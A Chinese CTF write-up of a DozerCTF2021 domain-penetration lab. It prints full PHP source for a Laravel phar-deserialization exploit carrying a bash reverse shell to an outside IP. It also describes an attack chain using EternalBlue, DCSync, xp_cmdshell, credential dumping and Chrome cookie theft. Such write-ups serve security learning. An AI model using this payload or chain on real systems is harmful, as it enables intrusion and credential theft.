---
title: DozerCTF2021 简单域渗透II Writeup
author: Loong716
date: 2021-06-01 14:10:00 +0800
categories: [CTF]
tags: [CTF]
---


周末打了DozerCTF的域渗透题目，题目思路很好，出题人和运维师傅也都很热心的解答问题，在这里还是首先感谢金陵科技学院的师傅们精心准备的赛题

中间环境下线和不稳定的问题耽误了一些时间，我在第一天下午的时候用非预期打完了，第二天开始看预期解，最后遗憾的就是没有按预期打完整个环境

以下是在做题期间的一些思路，文章最后有一些个人对比赛中考点的延伸扩展，算是我自己对预期的考点加以实战中遇到的情况的想象吧，对应也有很多种解法，这些可以延伸出很多有意思的点

* toc
{:toc}


## 0x00 非预期

lightcms 1.3.5的RCE漏洞魔改，dozer/dozer123进后台（这个弱密码卡了我很久），可以直接读文件：

![1622266123894.png](https://i.loli.net/2021/06/01/Xp8wWFvuAj4bg3L.png)

![1622266109785.png](https://i.loli.net/2021/06/01/IERc4skzg657yVH.png)

然后读漏洞点源码，审计发现写死了上传扩展名：

![1622283838597.png](https://i.loli.net/2021/06/01/kFRryhX7G1izZLM.png)

但可以先远程下载phar文件，再利用`file_get_contents`进行phar反序列化

poc如下，利用larvel的链：

``` php
<?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
    class BroadcastEvent
    {
      protected $connection;
      public function __construct($connection)
      {
        $this->connection = $connection;
      }
    }
}
namespace Illuminate\Bus{
    class Dispatcher{
        protected $queueResolver;
        public function __construct($queueResolver)
        {
          $this->queueResolver = $queueResolver;
        }
    }
}
namespace{
    $command = new Illuminate\Broadcasting\BroadcastEvent("bash -c 'bash -i >& /dev/tcp/117.53.27.121/13569 0>&1'");
    $dispater = new Illuminate\Bus\Dispatcher("system");
    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispater,$command);
    $phar = new Phar('phar.phar');
    $phar -> stopBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); 
    $phar -> addFromString('test.txt','test');
    $phar -> setMetadata($PendingBroadcast);
    $phar -> stopBuffering();
    rename('phar.phar','phar.txt');
}
```

生成phar文件并上传，然后利用phar伪协议：

![1622283986182.png](https://i.loli.net/2021/06/01/aSgwuEB1pGRH3Lx.png)

反弹shell：

![1622284010673.png](https://i.loli.net/2021/06/01/H5dzQYm79vbKATj.png)

探测一下内网服务，因为已知有域，重点探测88和389：

![1622326668783.png](https://i.loli.net/2021/06/01/ZIDecEuYlNBqJHC.png)


可以看到10.10.1.1开放了445、88、389，我们再从ldap确认一下（防止误认为vcenter等服务器）

![1622326712702.png](https://i.loli.net/2021/06/01/xDqctC2w9ZLrHBb.png)


然后再通过netbios看一下机器名，方便后面如果要打zerologon用

![1622326748426.png](https://i.loli.net/2021/06/01/wt6H3nOgE9U1MA2.png)


由于是ctf环境，所以优先考虑直接获取权限的漏洞，扫一波17010，发现域控存在该漏洞，且系统版本为2012，基本为稳定利用

![1622326790407.png](https://i.loli.net/2021/06/01/qMxf3ENDYBdz284.png)


直接使用msf来打：

![1622326113311.png](https://i.loli.net/2021/06/01/teqCu3NazsbrZGy.png)

读flag：

![1622326123872.png](https://i.loli.net/2021/06/01/vIFaKie7QoyC2nR.png)

利用域控机器账户可添加用户并加入域管组：

![1622326149707.png](https://i.loli.net/2021/06/01/LSE2G5BrRxPD41h.png)


dcsync，通过用户列表可以看出来环境里还存在exchange

![1622326179428.png](https://i.loli.net/2021/06/01/yYDKlh2dntjfbrg.png)

猜测最终的flag应该在flag用户的邮箱里（因为看过了ldap没有flag），考虑到不影响环境原本打算使用changentlm、setntlm来修改密码，然后再将密码还原回去（或者pth_to_ews，或者推组策略上exchange...总之域控已经拿下来方法就很多了）但这里暴力一点直接通过`net user`更改flag的密码，登录exchange拿到flag

![1622326499368.png](https://i.loli.net/2021/06/01/EZV5SXfG2d9o3vJ.png)

然后分别横向拿flag：

![1622326208338.png](https://i.loli.net/2021/06/01/FynWTqxjrmKcXeA.png)

![1622326212537.png](https://i.loli.net/2021/06/01/e8Lv61WfoDgAjTH.png)


题目描述提示有一台是存在杀软的，但现在已经有了凭据，直接连接CIFS把flag拷贝出来即可：

![1622539287884.png](https://i.loli.net/2021/06/01/pPX4zfsuLYV71MQ.png)


![1622326365600.png](https://i.loli.net/2021/06/01/zq6XLFd9cBUf1RK.png)

然后把剩下的一台不在域内的web打了就行了

## 0x01 正常打的

由于刚开始第一天是逆着打（从域控往外打），考点都是自己根据场景云想象的（瞎猜的），到第二天的时候思路已经有点晕了，flag也不知道该交哪个题，只能一个一个试

回到正题，第一台拿下后扫内网，发现有一台开着siteserverCMS，拿网上的exp怎么打都不行，后来发现换个目录就好了

改一下脚本上传目录的参数：

![1622364892318.png](https://i.loli.net/2021/06/01/ncUJKECOgXbHxh6.png)

exp打一下

![1622364933615.png](https://i.loli.net/2021/06/01/SujfKl5ZbYIcUM1.png)

成功拿到webshell

![1622364814318.png](https://i.loli.net/2021/06/01/Bf4z2gpixMWZlX7.png)


由于是iis用户所以就用sweetpotato提了权：

![1622364981912.png](https://i.loli.net/2021/06/01/F8VHdAB34jSKZnu.png)

flag在iis目录下的web.config.bak里面：

![1622365012584.png](https://i.loli.net/2021/06/01/VOKcsWAat15elXH.png)

这台不在域内，所以得找一下去域的路子，既然有web，首选就是先翻数据库配置文件：

拿到加密的链接，使用之前exp文章里的解密方法进行解密：

![1622365103700.png](https://i.loli.net/2021/06/01/VJmt7wRUfF1MbLj.png)


![1622365098923.png](https://i.loli.net/2021/06/01/ugKZjRnc5PbaON7.png)


可以看到连了内网另外一台sqlserver，是sa，并且这台有杀软

本来以为是360的，没想到是卡巴斯基，直接用xp_cmdshell就行

![1622365447203.png](https://i.loli.net/2021/06/01/ZOAzcm98Kfb5oBY.png)

flag：

![1622365452224.png](https://i.loli.net/2021/06/01/Z4zNuVIHnDjEeK8.png)


添加管理员用户并利用clr开启3389：

![1622365744526.png](https://i.loli.net/2021/06/01/5VIZjp2ikOHqaRW.png)

利用RPC加载SSP，直接用之前优化过的工具dump

![1622368770460.png](https://i.loli.net/2021/06/01/Qdkpzyxw3joFBOY.png)

结果竟然没域的凭据：

![1622369354506.png](https://i.loli.net/2021/06/01/NosKl2EPaSVhw5e.png)


不过我们psexec提到system，这样暂时就算入域了

![1622369716444.png](https://i.loli.net/2021/06/01/FZJ2ROuYkAzNrUK.png)

到这bloodhound跑了一下，没看到啥东西，打不动了，溜了

赛后问了下出题人，原来是有个第三方进程，dump下来

![1622447332894.png](https://i.loli.net/2021/06/01/AtiTOmkucdeylof.png)

拿到alice的密码

![1622447246742.png](https://i.loli.net/2021/06/01/zOu8C61MkHqXJBe.png)

然后登alice-pc

![1622539409867.png](https://i.loli.net/2021/06/01/MeCSAZ3dEau6rK8.png)

上面跑着chrome进程

![1622447566257.png](https://i.loli.net/2021/06/01/9NG8XpADthcKond.png)


拖chrome的数据：

![1622450006813.png](https://i.loli.net/2021/06/01/beWFKM8JYC4jhcX.png)

拿到另一台wordpress的cookie，这里cookie没了

![1622449973211.png](https://i.loli.net/2021/06/01/QPOEzTpi71k9tUc.png)


然后就是cookie过wordpress的二次认证，后台getshell，dump lsass登域控，结束，预期拿flag用户的flag就是pth_to_ews，但是方法其实有很多，就不多说了

## 0x02 总结

打完之后感觉出题的师傅应该实战经验是比较足的，因为全程是没有过多的考到域内的手法（SPN、委派等），基本都是考查渗透过程中的基本功。个人认为比我安洵杯的那道题出的要好得多，而且不管是预期还是非预期其实可以延伸出来很多东西

